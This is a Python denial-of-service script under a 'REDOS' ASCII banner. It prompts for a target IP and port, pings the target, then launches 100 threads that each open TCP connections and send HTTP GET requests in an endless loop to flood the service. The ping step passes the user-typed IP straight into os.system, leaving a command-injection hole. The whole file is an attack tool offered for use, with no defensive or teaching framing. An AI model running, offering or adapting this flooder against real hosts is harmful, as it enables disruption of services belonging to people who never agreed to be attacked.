import socket
import threading
from colorama import Fore, init
import subprocess
import os
init(autoreset=True)




try:
    print(Fore.RED + """
                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                  ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                   ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
    """)

    ip = input(Fore.RED + "Enter Target IP: " + Fore.RESET)
    port = int(input(Fore.RED + "\nEnter open port: " + Fore.RESET))


    def is_online():
        response = os.system("ping -c 1 " + ip)
        if response == 0:
            print(Fore.GREEN + "\n[+] Target is up" + Fore.RESET)
        else:
            print(Fore.YELLOW + "\n[-] Target is offline" + Fore.RESET)


    def flood():
        print(Fore.CYAN + "\n[*] Starting flood thread..." + Fore.RESET)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + bytes(ip, "utf-8") + b"\r\n\r\n")
                s.close()
                print(Fore.GREEN + "\n[+] Packet sent!" + Fore.RESET)
            except:
                print(Fore.RED + "\n[-] Failed to send packet" + Fore.RESET)
                pass

    is_online()

    for i in range(100):
        t = threading.Thread(target=flood)
        t.start()

except KeyboardInterrupt:
    print(Fore.GREEN + "\nKeyboard Interrupt detected. Closing . . . ")
